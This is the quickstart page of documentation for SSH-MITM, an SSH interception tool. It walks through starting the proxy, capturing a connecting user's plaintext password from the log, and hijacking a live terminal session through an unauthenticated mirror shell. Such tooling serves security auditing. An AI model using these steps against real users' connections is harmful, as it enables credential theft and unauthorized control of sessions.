Quickstart
==========

Eager to get started? This page gives a good introduction in how to get started with SSH-MITM.

First, make sure that:

* SSH-MITM is :ref:`installed <Installation>`
* SSH-MITM is up-to-date

Let’s get started with some simple examples.


Start ssh-mitm proxy server
---------------------------

Starting an intercepting mitm-ssh server with password authentication is very simple.

All you have to do is run this command in your terminal of choice.

.. code-block:: bash
    :linenos:

    $ ssh-mitm --remote-host 192.168.0.x

Now let's try to connect to the ssh-mitm server.
The ssh-mitm server is listening on port 10022.

.. code-block:: bash
    :linenos:

    $ ssh -p 10022 user@proxyserver

You will see the credentials in the log output.


.. code-block:: none

    INFO     Remote authentication succeeded
        Remote Address: 127.0.0.1:22
        Username: user
        Password: supersecret
        Agent: no agent


Hijack a SSH terminal session
-----------------------------

Getting the plain text credentials is only half the fun.
SSH-MITM proxy server is able to hijack a ssh session and allows you to interact with it.

Let's get started with hijacking the session.

When a client connects, the ssh-mitm proxy server starts a new server, where you can connect with another ssh client.
This server is used to hijack the session.

.. code-block:: none

    INFO     ℹ created mirrorshell on port 34463. connect with: ssh -p 34463 127.0.0.1

To hijack the session, you can use your favorite ssh client. This connection does not require authentication.

.. code-block:: bash
    :linenos:

    $ ssh -p 34463 127.0.0.1

After you are connected, your session will only be updated with new responses, but you are able to execute commands.

Try to execute somme commands in the hijacked session or in the original session.

The output will be shown in both sessions.
